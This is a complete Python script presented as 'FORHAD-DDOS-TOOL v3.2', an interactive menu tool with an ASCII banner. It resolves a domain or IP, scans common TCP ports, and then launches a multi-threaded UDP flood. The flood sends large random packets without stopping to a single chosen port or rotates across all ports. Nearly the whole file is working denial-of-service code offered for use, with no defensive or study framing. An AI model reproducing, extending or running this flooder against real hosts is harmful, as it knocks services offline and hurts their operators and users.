#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FORHAD-DDOS-TOOL v3.2 Full Pro
Author: Forhad Hasan
GitHub: https://github.com/Forhadj
License: MIT
"""

import os
import socket
import random
import time
from platform import system
from threading import Thread

# Version
VERSION = "3.2"

# Detect OS for clear command
cmd_clear = "cls" if system() == "Windows" else "clear"

# Clear screen
def clear():
    os.system(cmd_clear)

# Random colored ASCII logo + banner
def logo():
    colors = ["\033[91m","\033[92m","\033[93m","\033[94m","\033[95m","\033[96m"]
    color = random.choice(colors)
    print(color)
    print(r"""
####### ####### ######  #     #    #    ######  
#       #     # #     # #     #   # #   #     # 
#       #     # #     # #     #  #   #  #     # 
#####   #     # ######  ####### #     # #     # 
#       #     # #   #   #     # ####### #     # 
#       #     # #    #  #     # #     # #     # 
#       ####### #     # #     # #     # ######

                                                          
  ;                     @tt8ddddX8t%:                     t 
 tXS                  @5X@@@8888@@@@8@8                  88;
 tgkt               @S88@@@@@@@@@@@@@@8@8               8h@:
 :g8:S            ;88X@@@@@@@@@@@@@@@@@@8X;           ;S@8 
  tXXSS           t8X@@@@@@88X88@88@@X@@Xdd          hl@8X@:
  @@@XX:;        8%X@@@@@888888888@X88@@@@t8        tS8@@S8
   %8@@@j;:      X@@tXX88@@@@8@@8@888@@@%8@@      :o;XX@8;
   %k@@@X8@t     8XS88@@8@@@@@@@@@@@@@@8@@X%     t88X@@@ :
    @tXX8X8f;;   %@@%8@@X@@@@X88S88@X8@8% 8@   ;:k8S8@X:8   
     8g8@8h:@;t% 8SX@ @:::8t88888j@:::hSX@@ S;t@:o8@8XX
      ;u888SS8@;t % :%     S:@@@ :     XSk;yt;S8@i8X@8;     
       :S@@8j8j@888:t@     8t8 8:X     8@k@888k8k8@Xt;
         X88@8k88;t%@ @:hXh88%  88 %@::@88ut88u8@X@X       
           @;X@8S@ 888@@@@8@8    88@@@8@@@8Xu8@@k8   
            S;;@@X8@    t@@@ %   X@8t   XX8X@8:o%          
              :X8X@8 % @;8X@@88@@@@@%  S:8@S88      
                 @888t ;X@8@8@88888%Xt %@8@X                
                   8;th t:SS8 8 @@St 8 S:@                
                     th8@X         S8@8:               
                      8:XX8@@8X88@@@@k@                    
                   tX@htX%%8@X@@@@8tS% SXt            
               @8%Sj@@h@ @        %88y:Xy88              
            tt8% 8%S;X8 tt         t8@f%;8k@@X;       
          St@@8@kShtj;8             8hS%uSh888k8;%       
     X@XX8t88@SX8SX@;                :SXXX8S88888:8;X@    
    %88% %y@k@8:@@@8                  S@@8t:8X:8&8%X@8: 
   XtS@hti888tuj:@88:                   @8X@%88%88@8;tX@:@
    :;8S%S;:Xti;;:@                      8;SS6@S:::X@X8::: 
     t88jS%ug88X8                           84X@:4;8@88: 
        %SojjS@:                              8%jj:@S
 

             FORHAD-DDOS-TOOL v3.2 | UDP Flooder
    """)
    print("\033[0m")  # Reset color

# Detect common ports
def detect_ports(ip, ports=[21,22,23,25,53,80,443,3389]):
    open_ports = []
    print(f"\033[36;1m[~] Scanning common ports on {ip}...\033[0m")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        try:
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
        except:
            pass
        sock.close()
    return open_ports

# Multi-threaded UDP Flood attack
def udp_flood(ip, port, rotate_ports=False, threads=100):
    def attack_thread(ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1490)
        sent = 0
        while True:
            try:
                if rotate_ports:
                    if port >= 65534:
                        port = 1
                    elif port == 1900:
                        port = 1901
                sock.sendto(payload, (ip, port))
                sent += 1
                print(f"\033[32;1m[✓] Sent {sent} packets to {ip}:{port}\033[0m")
                if rotate_ports:
                    port += 1
            except KeyboardInterrupt:
                print("\n\033[31;1m[!] Attack stopped by user.\033[0m")
                break

    print(f"\033[36;1m[~] Launching {threads} threads on {ip}:{port}...\033[0m")
    thread_list = []
    for _ in range(threads):
        t = Thread(target=attack_thread, args=(ip, port))
        t.daemon = True
        t.start()
        thread_list.append(t)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[31;1m[!] Attack stopped by user.\033[0m")

# Menu system
def menu():
    while True:
        clear()
        logo()
        print("╔══════════════════════════════╗")
        print(f"║      \033[93mFORHAD-DDOS-TOOL v{VERSION}\033[0m      ║")
        print("╚══════════════════════════════╝")
        print("[1] Scan Domain/IP for IP + Open Ports")
        print("[2] Start Multi-threaded UDP Flood")
        print("[3] About")
        print("[0] Exit")

        choice = input("\n>> Enter your choice: ").strip()

        if choice == "1":
            target = input("[+] Enter Domain or IP: ").strip()
            try:
                ip = socket.gethostbyname(target)
                print(f"\033[32;1m[✓] Resolved IP: {ip}\033[0m")
                ports = detect_ports(ip)
                if ports:
                    print(f"\033[33;1m[•] Open ports detected: {ports}\033[0m")
                else:
                    print("\033[33;1m[•] No common open ports detected.\033[0m")
            except socket.gaierror:
                print("\033[31;1m[x] Invalid domain or IP!\033[0m")
            input("\nPress Enter to return to menu...")

        elif choice == "2":
            target = input("[+] Enter Domain or IP: ").strip()
            try:
                ip = socket.gethostbyname(target)
            except socket.gaierror:
                print("\033[31;1m[x] Invalid domain or IP!\033[0m")
                time.sleep(2)
                continue

            port_mode = input("[?] Certain port? (y/n): ").lower()
            rotate_ports = False
            if port_mode == "y":
                try:
                    port = int(input("[+] Enter Port: "))
                except:
                    print("[x] Invalid port!")
                    time.sleep(2)
                    continue
            elif port_mode == "n":
                port = 2
                rotate_ports = True
            else:
                print("[x] Invalid choice!")
                time.sleep(2)
                continue

            try:
                threads = int(input("[+] Enter number of threads (50-500 recommended): "))
            except:
                threads = 100

            print(f"\n\033[36;2m[~] INITIALIZING ATTACK on {ip}:{port} with {threads} threads...\033[0m")
            time.sleep(1)
            udp_flood(ip, port, rotate_ports, threads)

        elif choice == "3":
            clear()
            logo()
            print("\n\033[92m[•] Author:\033[0m Forhad Hasan")
            print("\033[92m[•] GitHub:\033[0m https://github.com/Forhadj")
            print("\033[92m[•] Version:\033[0m", VERSION)
            print("\033[92m[•] Features:\033[0m")
            print("   - Random colored ASCII logo")
            print("   - Domain/IP auto resolve")
            print("   - Common port scan")
            print("   - Multi-threaded UDP Flood attack")
            input("\nPress Enter to return to menu...")

        elif choice == "0":
            print("Goodbye!")
            break
        else:
            print("[x] Invalid option!")
            time.sleep(2)

# Run the menu
if __name__ == "__main__":
    menu()
